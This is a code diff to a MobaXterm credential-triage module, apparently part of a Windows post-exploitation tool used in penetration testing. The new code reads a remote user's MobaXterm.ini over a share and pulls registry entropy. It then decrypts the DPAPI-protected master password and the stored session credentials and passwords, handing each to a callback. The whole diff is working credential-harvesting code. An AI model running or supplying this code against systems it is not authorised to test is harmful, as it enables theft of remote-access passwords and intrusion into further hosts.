@@ -132,7 +132,8 @@ class MobaXtermTriage:
         "Default User",
         "All Users",
     ]
-    mobaxterm_registry_key_path = "Software\\Mobatek\\MobaXterm"
+    mobaxterm_conf_file_path = "Users\\{username}\\AppData\\Roaming\\MobaXterm\\MobaXterm.ini"
+    mobaxterm_registry_key_path = "SOFTWARE\\Mobatek\\MobaXterm"
     mobaxterm_sessionp_key_path = ntpath.join(mobaxterm_registry_key_path, "SessionP")
     mobaxterm_masterpassword_registry_key = "M"
     mobaxterm_passwords_registry_key = "P"
@@ -189,10 +190,13 @@ class MobaXtermTriage:
         mobaxterm_masterpassword = None
         mobaxterm_credentials = []
 
-        logging.debug(f"Triaging MobaXterm for user {user}")
-        mobaxterm_masterpassword, mobaxterm_credentials = (
-            self.extract_mobaxtermkeys_for_user_from_remote_registry(user, sid)
-        )
+        mobaxterm_masterpassword, mobaxterm_credentials = self.extract_mobaxtermkeys_for_user_from_files(user, sid)
+        if mobaxterm_masterpassword is None or len(mobaxterm_credentials) == 0:
+
+            logging.debug(f"Triaging MobaXterm for user {user}")
+            mobaxterm_masterpassword, mobaxterm_credentials = (
+                self.extract_mobaxtermkeys_for_user_from_remote_registry(user, sid)
+            )
 
         if mobaxterm_masterpassword is None and offline_users:
             try:
@@ -328,18 +332,9 @@ class MobaXtermTriage:
                 logging.debug(str(e))
         return mobaxterm_masterpassword_key, mobaxterm_credentials
 
-    def extract_mobaxtermkeys_for_user_from_remote_registry(
-        self, user: str, sid: str
-    ) -> Tuple[
-        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
-    ]:
-        self.conn.enable_remoteops()
-
-        entropy = None
-        mobaxterm_masterpassword_key = None
-        mobaxterm_credentials = []
-
+    def extract_entropy_for_user(self, user: str, sid: str):
         # Extract entropy
+        entropy = None
         ans = rrp.hOpenUsers(self.conn.remote_ops._RemoteOperations__rrp)
         regHandle = ans["phKey"]
         regKey = ntpath.join(sid, self.mobaxterm_registry_key_path)
@@ -369,7 +364,92 @@ class MobaXtermTriage:
 
                 traceback.print_exc()
                 logging.error(f"Error while hBaseRegOpenKey HKU\\{regKey}: {e}")
+        return entropy
+
+    def extract_mobaxtermkeys_for_user_from_files(self, user: str, sid: str) -> Tuple[
+        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
+    ]:
+        self.conn.enable_remoteops()
+
+        mobaxterm_masterpassword_key = None
+        mobaxterm_credentials = []
+
+        # Extract entropy
+        entropy = self.extract_entropy_for_user(user, sid)
+        if entropy is None:
             return None, []
+        
+        # Extract all
+        try:
+            conf_file = self.conn.readFile(
+                self.share, self.mobaxterm_conf_file_path.format(username=user), looted_files=self.looted_files
+            )
+            dpapi_blob = conf_file.split(b"[Sesspass]\r\n")[1].split(b"\r\n")[0].split(b"=",1)[1]
+            mobaxterm_masterpassword_key = MobaXtermMasterPassword(
+                winuser=user,
+                entropy=entropy,
+                host="",
+                username="",
+                masterpassword_raw_value=dpapi_blob
+            )
+            
+            mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
+                masterkeys=self.masterkeys
+            )
+
+            logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
+
+            credentials = conf_file.split(b"[Credentials]\r\n")[1].split(b"\r\n\r\n")[0]
+            for credential in credentials.split(b"\r\n"):
+                name, username = credential.decode().split("=",1)
+                username, password_encrypted = username.split(":",1)
+                mobaxterm_credential = MobaXtermCredential(
+                    winuser=user,
+                    name=name,
+                    username=username,
+                    password_encrypted=password_encrypted,
+                )
+                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
+                mobaxterm_credentials.append(mobaxterm_credential)
+                if self.per_secret_callback is not None:
+                    self.per_secret_callback(mobaxterm_credential)
+
+            passwords = conf_file.split(b"[Passwords]\r\n")[1].split(b"\r\n\r\n")[0]
+            for password in passwords.split(b"\r\n"):
+                username, encrypted_pass = password.decode().split("=",1)
+                mobaxterm_credential = MobaXtermPassword(
+                    winuser=user, username=username, password_encrypted=encrypted_pass
+                )
+                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
+                mobaxterm_credentials.append(mobaxterm_credential)
+                if self.per_secret_callback is not None:
+                    self.per_secret_callback(mobaxterm_credential)
+        except Exception as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+
+                traceback.print_exc()
+            logging.debug(str(e))
+        return mobaxterm_masterpassword_key, mobaxterm_credentials
+
+    def extract_mobaxtermkeys_for_user_from_remote_registry(
+        self, user: str, sid: str
+    ) -> Tuple[
+        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
+    ]:
+        self.conn.enable_remoteops()
+
+        mobaxterm_masterpassword_key = None
+        mobaxterm_credentials = []
+
+        # Extract entropy
+        entropy = self.extract_entropy_for_user(user, sid)
+        if entropy is None:
+            return None, []
+        
+        ans = rrp.hOpenUsers(self.conn.remote_ops._RemoteOperations__rrp)
+        regHandle = ans["phKey"]
+        regKey = ntpath.join(sid, self.mobaxterm_registry_key_path)
 
         # Extract M
         try:
@@ -398,13 +478,46 @@ class MobaXtermTriage:
             )
             logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
             rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
+        except rrp.DCERPCSessionError as e:
+            # try extract with file
+            if e.get_error_code() == ERROR_FILE_NOT_FOUND:
+                try:
+                    conf_file = self.conn.readFile(
+                                self.share, self.mobaxterm_conf_file_path.format(username=user), looted_files=self.looted_files
+                            )
+                    dpapi_blob = conf_file.split(b"[Sesspass]\r\n")[1].split(b"\r\n")[0].split(b"=",1)[1]
+                    mobaxterm_masterpassword_key = MobaXtermMasterPassword(
+                        winuser=user,
+                        entropy=entropy,
+                        host="",
+                        username="",
+                        masterpassword_raw_value=dpapi_blob
+                    )
+                    
+                    mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
+                        masterkeys=self.masterkeys
+                    )
+
+                    logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+
+                        traceback.print_exc()
+                    logging.debug(str(e))
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+
+                traceback.print_exc()
+                logging.debug(str(e))
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
 
                 traceback.print_exc()
                 logging.debug(str(e))
-
+        if mobaxterm_masterpassword_key is None:
+            return None, []
         # Extract C and P
         for key in [
             self.mobaxterm_credentials_registry_key,
